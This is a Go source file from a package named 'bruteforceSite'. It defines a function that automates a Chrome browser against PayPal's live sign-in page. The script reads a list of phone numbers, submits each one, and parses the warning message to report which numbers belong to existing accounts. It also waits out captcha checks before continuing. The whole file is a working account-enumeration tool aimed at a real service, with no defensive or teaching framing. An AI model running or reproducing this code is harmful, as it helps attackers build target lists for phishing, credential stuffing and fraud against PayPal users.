package bruteforceSite

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/chromedp/chromedp/kb"
)

func BrutePaypal() {
	payloads := []string{}
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		payloads = append(payloads, strings.Replace(scanner.Text(), "+", "", -1))
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "Erro de leitura:", err)
	}
	url := "https://www.paypal.com/signin"
	options := []chromedp.ExecAllocatorOption{
		chromedp.Flag("ignore-certificate-errors", "1"),
		chromedp.Flag("headless", false), // set headless to false
		chromedp.Flag("disable-gpu", true),
	}
	ctx, cancel := chromedp.NewContext(
		context.Background(),
		chromedp.WithDebugf(log.Printf),
	)
	defer cancel()
	ctx, cancel = chromedp.NewExecAllocator(ctx, options...)
	defer cancel()
	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()
	ctx, cancel = context.WithTimeout(ctx, 1800*time.Second)
	defer cancel()
	err := chromedp.Run(ctx,
		chromedp.Navigate(url),
	)
	if err != nil {
		log.Fatal(err)
	}
	errorUser := ""
	firsAcess := true
	for indexPayload := 0; indexPayload < len(payloads); indexPayload++ {
		isRestart := ""
		PhoneNumber := payloads[indexPayload]
		fmt.Println("Trying Phone Number:", PhoneNumber)
		if errorUser != "" || firsAcess {
			err := chromedp.Run(ctx,
				chromedp.WaitVisible(`#email`, chromedp.ByID),
				chromedp.Sleep(1*time.Second),
				chromedp.SendKeys(`#email`, PhoneNumber, chromedp.ByID),
				chromedp.Sleep((15/10)*time.Second),
				chromedp.KeyEvent(kb.Enter),
				chromedp.WaitReady(`.transitioning.spinner`, chromedp.ByQuery),
				chromedp.WaitReady(`.notification-warning, .transitioning.hide`, chromedp.ByQuery),
				chromedp.Sleep(1*time.Second),
				chromedp.Evaluate(`!document.getElementsByClassName("notification-warning")[0].className.includes("hide")?document.getElementsByClassName("notification-warning")[0].innerText:""`, &errorUser),
			)
			if err != nil {
				log.Fatal(err)
			}
		} else {
			err := chromedp.Run(ctx,
				chromedp.WaitReady(`#backToInputEmailLink`, chromedp.ByID),
				chromedp.Evaluate(`document.querySelector("#backToInputEmailLink").parentElement.className.includes("hide")?"":"visible"`, &isRestart),
			)
			if err != nil {
				log.Fatal(err)
			}
			if isRestart == "visible" {
				err = chromedp.Run(ctx,
					chromedp.WaitVisible(`#backToInputEmailLink`, chromedp.ByID),
					chromedp.Evaluate(`document.getElementById("backToInputEmailLink").click()`, nil),
					chromedp.SendKeys(`#email`, PhoneNumber, chromedp.ByID),
					chromedp.Sleep((15/10)*time.Second),
					chromedp.KeyEvent(kb.Enter),
					chromedp.WaitReady(`.transitioning.spinner`, chromedp.ByQuery),
					chromedp.WaitReady(`.notification-warning, .transitioning.hide`, chromedp.ByQuery),
					chromedp.Sleep(1*time.Second),
					chromedp.Evaluate(`!document.getElementsByClassName("notification-warning")[0].className.includes("hide")?document.getElementsByClassName("notification-warning")[0].innerText:""`, &errorUser),
				)
				if err != nil {
					log.Fatal(err)
				}
			} else {
				err := chromedp.Run(ctx,
					chromedp.WaitVisible(`#email`, chromedp.ByID),
					chromedp.Sleep(1*time.Second),
					chromedp.WaitNotPresent(`[action='/auth/validatecaptcha']`, chromedp.ByQuery),
					chromedp.Sleep(1*time.Second),
					chromedp.Evaluate(`!document.getElementsByClassName("notification-warning")[0].className.includes("hide")?document.getElementsByClassName("notification-warning")[0].innerText:""`, &errorUser),
				)
				if err != nil {
					log.Fatal(err)
				}
			}
		}
		if errorUser != "" {
			fmt.Println("[-] User Not Exist:", PhoneNumber)
		} else {
			fmt.Println("[!] User Exist:", PhoneNumber)
		}
		time.Sleep(1 * time.Second)

		firsAcess = false
	}
}
